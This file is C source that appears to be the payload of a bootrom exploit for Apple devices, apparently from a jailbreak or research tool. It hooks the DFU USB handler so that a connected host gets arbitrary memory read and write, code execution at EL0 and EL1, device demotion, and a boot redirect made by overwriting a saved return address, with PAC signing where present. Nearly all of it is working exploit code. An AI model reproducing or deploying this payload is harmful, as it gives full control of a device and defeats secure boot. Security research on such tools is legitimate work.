#include <stdint.h>
#include <stdlib.h>
#include "offsets.h"

#define USB_DIRECTION_MASK  0x80
#define USB_DEVICE2HOST     0x80
#define USB_HOST2DEVICE     0x00
#define USB_TYPE_CLASS      0x20
#define USB_RECIP_INTERFACE 0x01

#define EP0_IN  0x80

#define REQUEST_TYPE   (USB_DEVICE2HOST | USB_TYPE_CLASS | USB_RECIP_INTERFACE)
#define REQUEST_VALUE  0xFFFF

#define MESSAGE_MAGIC      0x2D2A4E5741502A2DULL
#define MESSAGE_BODY_SIZE  0x100

struct usb_device_request {
    uint8_t  bmRequestType;
    uint8_t  bRequest;
    uint16_t wValue;
    uint16_t wIndex;
    uint16_t wLength;
} __attribute__((packed));

enum {
    DFU_DETACH = 0,
    DFU_DNLOAD,
    DFU_UPLOAD,
    DFU_GETSTATUS,
    DFU_CLR_STATUS,
    DFU_GETSTATE,
    DFU_ABORT,
    CUSTOM_DEMOTE,
    CUSTOM_BOOT,
};

enum {
    MESSAGE_TYPE_INVALID = 0,
    MESSAGE_TYPE_EXECUTE = 0x45,
    MESSAGE_TYPE_EXECUTE_EL1 = 0x65,
    MESSAGE_TYPE_READ    = 0x52,
    MESSAGE_TYPE_WRITE   = 0x57,
    MESSAGE_TYPE_TEST    = 0x54
};

struct message {
    uint64_t magic;
    uint32_t type;
    uint32_t reserved;
    uint64_t arg;
    uint64_t length;
    uint8_t  body[MESSAGE_BODY_SIZE];
} __attribute__((packed));

static int  (*orig_handle_usb_req)(struct usb_device_request *request, uint8_t **io_buffer) = (void *)HANDLE_USB_REQ;
static void (*platform_demote)() = (void *)PLATFORM_DEMOTE;
static void (*platform_set_remote_boot)() = (void *)PLATFORM_SET_REMOTE_BOOT;
static void (*finish_usb_transfer)(int32_t arg1, int64_t arg2, int32_t arg3, int64_t arg4) = (void*)FINISH_USB_TRANSFER;
static void (*panic)(uint64_t, uint64_t) = (void*)PANIC;

#if WITH_PAC

__attribute__((naked))
uint64_t PACIB(uint64_t ptr, uint64_t ctx) {
    asm("PACIB x0, x1");
    asm("RET");
}

#endif

static void copy_bytes(uint8_t *dst, const uint8_t *src, uint64_t length) {
    volatile uint8_t *vdst = dst;
    const volatile uint8_t *vsrc = src;

    for (uint64_t i = 0; i < length; i++) {
        vdst[i] = vsrc[i];
    }
}

static void sync_memory_writes(void) {
    asm volatile(
        "dsb sy\n"
        "isb\n"
        ::: "memory"
    );
}

__attribute__((noinline))
static void enter_el1(void) {
    asm volatile("svc #0" ::: "memory");
}

__attribute__((noinline))
static void return_to_el0(void) {
    asm volatile(
        "adr x0, 1f\n"
        "msr elr_el1, x0\n"
        "mov x0, #0x100\n"
        "msr spsr_el1, x0\n"
        "eret\n"
        "1:\n"
        ::: "x0", "memory"
    );
}

static uint8_t *write_destination(uint64_t address, uint64_t length) {
#if defined(ROM_BASE) && defined(ROM_WRITE_ALIAS) && defined(ROM_SIZE)
    if (address >= ROM_BASE && length <= ROM_SIZE && address - ROM_BASE <= ROM_SIZE - length) {
        return (uint8_t *)(ROM_WRITE_ALIAS + (address - ROM_BASE));
    }
#endif

    return (uint8_t *)address;
}

static void write_bytes(uint64_t address, const uint8_t *src, uint64_t length) {
    const volatile uint8_t *vsrc = src;

    for (uint64_t i = 0; i < length; i++) {
        *(volatile uint8_t *)write_destination(address + i, 1) = vsrc[i];
    }
}

__attribute__((naked))
static void execute(uint64_t destination, uint8_t *body) {
    asm(
        "stp x19, x30, [sp, #-0x10]!\n"
        "mov x14, x0\n"
        "mov x19, x1\n"
        "mov x15, x1\n"
        "ldp x0, x1, [x15], #0x10\n"
        "ldp x2, x3, [x15], #0x10\n"
        "ldp x4, x5, [x15], #0x10\n"
        "ldp x6, x7, [x15], #0x10\n"
        "blr x14\n"
        "mov x15, x19\n"
        "stp x0, x1, [x15], #0x10\n"
        "stp x2, x3, [x15], #0x10\n"
        "stp x4, x5, [x15], #0x10\n"
        "stp x6, x7, [x15], #0x10\n"
        "ldp x19, x30, [sp], #0x10\n"
        "ret\n"
    );
}

static void execute_el1(uint64_t destination, uint8_t *body) {
    enter_el1();
    execute(destination, body);
    return_to_el0();
}

int custom_handle_usb_req(struct usb_device_request *request, uint8_t **io_buffer) {
    uint8_t bmRequestType = request->bmRequestType;
    uint8_t bRequest      = request->bRequest;

    if (bmRequestType == REQUEST_TYPE && bRequest == DFU_UPLOAD && request->wValue == REQUEST_VALUE) {
        struct message *message = (struct message *)DFU_BASE;

        if (message->magic == MESSAGE_MAGIC) {
            uint64_t length = message->length;

            if (length > MESSAGE_BODY_SIZE) {
                length = MESSAGE_BODY_SIZE;
                message->length = length;
            }

            switch (message->type) {
                case MESSAGE_TYPE_TEST: {
                    (*(uint64_t *)message->body)++;
                    break;
                }

                case MESSAGE_TYPE_READ: {
                    copy_bytes(message->body, (const uint8_t *)message->arg, length);
                    break;
                }

                case MESSAGE_TYPE_WRITE: {
                    write_bytes(message->arg, message->body, length);
                    sync_memory_writes();
                    break;
                }

                case MESSAGE_TYPE_EXECUTE: {
                    execute(message->arg, message->body);
                    break;
                }

                case MESSAGE_TYPE_EXECUTE_EL1: {
                    execute_el1(message->arg, message->body);
                    break;
                }
            }

            finish_usb_transfer(0x80, DFU_BASE, request->wLength, 0);
            return 0;
        }

        return orig_handle_usb_req(request, io_buffer);
    }

    if ((bmRequestType & USB_DIRECTION_MASK) == USB_HOST2DEVICE) {
        switch (bRequest) {
            case CUSTOM_DEMOTE: {
                platform_demote();
                return 0;
            }

            case CUSTOM_BOOT: {
                platform_set_remote_boot();

                uint64_t ptr = -1;
#if WITH_PAC
                ptr = PACIB(JUMP_AWAY, MAIN_TASK_STACK_LR + 8);
#else
                ptr = JUMP_AWAY;
#endif

                *(volatile uint64_t *)MAIN_TASK_STACK_LR = ptr;
                return 0;
            }
        }

    } else if ((bmRequestType & USB_DIRECTION_MASK) == USB_DEVICE2HOST) {
        /* KBAG decryption folks? */
    }

    /* everything that doesn't fall under the conditions above goes to the original handler */
    return orig_handle_usb_req(request, io_buffer);
}
